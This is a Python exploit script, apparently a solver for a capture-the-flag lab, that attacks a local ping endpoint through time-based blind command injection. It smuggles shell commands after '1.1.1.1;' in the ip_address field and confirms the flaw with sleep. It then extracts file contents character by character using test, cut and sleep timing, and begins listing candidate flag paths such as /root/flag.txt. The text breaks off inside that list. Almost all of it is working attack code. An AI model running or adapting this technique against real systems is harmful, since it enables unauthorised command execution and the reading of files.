import requests
import time
import string
import urllib.parse

# Target configuration
TARGET_URL = "http://127.0.0.1:32817/ping"
TIMEOUT = 30

# Character set for extraction
CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
PROMISING_CHARS = string.ascii_letters + string.digits + "{_-/.} "

def test_command(cmd, expected_delay=0):
    """Execute command and return response time"""
    payload = f"1.1.1.1;{cmd}"
    data = {"ip_address": payload}
    
    start_time = time.time()
    try:
        response = requests.post(TARGET_URL, data=data, timeout=TIMEOUT)
        elapsed = time.time() - start_time
        return elapsed
    except:
        elapsed = time.time() - start_time
        return elapsed

def check_file_exists(filepath):
    """Check if file exists using test -f"""
    cmd = f"test -f {filepath} && sleep 3"
    elapsed = test_command(cmd)
    return elapsed >= 2.5

def extract_char_at_position(filepath, position):
    """Extract single character at position using cut and comparison"""
    # Method: Use cut to get character at position, then compare with test
    for char in PROMISING_CHARS:
        # Escape special chars for comparison
        if char in ["'", '"', ' ', '$']:
            escaped_char = f"\\{char}"
        else:
            escaped_char = char
            
        # Build command: extract char with cut and compare
        cmd = f"test \"$(cat {filepath} | cut -c {position} | head -1)\" = \"{escaped_char}\" && sleep 3"
        elapsed = test_command(cmd)
        
        if elapsed >= 2.5:
            print(f"  Position {position}: '{char}'")
            return char
    
    return None

def extract_line(filepath, max_length=100):
    """Extract full line from file"""
    result = ""
    
    print(f"\n[*] Extracting content from {filepath}")
    
    for pos in range(1, max_length + 1):
        char = extract_char_at_position(filepath, pos)
        if char is None:
            print(f"  Stopped at position {pos-1}")
            break
        result += char
        
        # Check if we have FLAG pattern
        if "FLAG{" in result:
            # Once we find FLAG{, extract until }
            if "}" in result:
                print(f"\n[+] EXTRACTED FLAG: {result}")
                return result
    
    return result

# First, verify the vulnerability is working
print("[STEP 1] Confirming command injection vulnerability")
cmd = "sleep 5"
elapsed = test_command(cmd)
print(f"Testing 'sleep 5': {elapsed:.2f} seconds")

if elapsed >= 4.5:
    print("[+] Vulnerability confirmed!")
else:
    print("[-] Vulnerability not working as expected")
    exit(1)

# List of paths to check for flags
potential_flag_files = [
    "/flag",
    "/flag.txt",
    "/tmp/flag.txt",
    "/app/flag.txt",
    "/home/flag.txt",
    "/root/flag.txt",
    "/var/www/flag.txt",
    "/etc/flag.txt",
    "/opt/flag.txt",
    "/usr/local/flag.txt",
    "/home/*/flag.txt",
    "/flag/flag.txt",
